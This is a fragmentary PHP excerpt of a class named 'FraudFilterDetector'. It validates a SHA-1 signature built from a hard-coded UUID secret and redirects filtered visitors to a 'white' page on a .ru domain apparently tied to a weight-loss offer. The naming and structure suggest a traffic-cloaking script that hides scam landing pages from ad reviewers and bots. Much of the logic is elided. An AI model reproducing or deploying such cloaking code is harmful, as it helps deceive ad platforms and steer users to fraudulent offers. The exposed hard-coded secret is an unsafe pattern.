...
class FraudFilterDetector_uajb0 {
    ...
    function isSignatureValid($sign, $time) {
        $str = 'e80a2298-f3bd-41ad-99df-7f9d0c6491a5.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('http://pohudenie.thenotoriouscpa.ru/th2/white/');
    }
...
$fraudFilterDetector_uajb0 = new FraudFilterDetector_uajb0();
$fraudFilterDetector_uajb0->check();
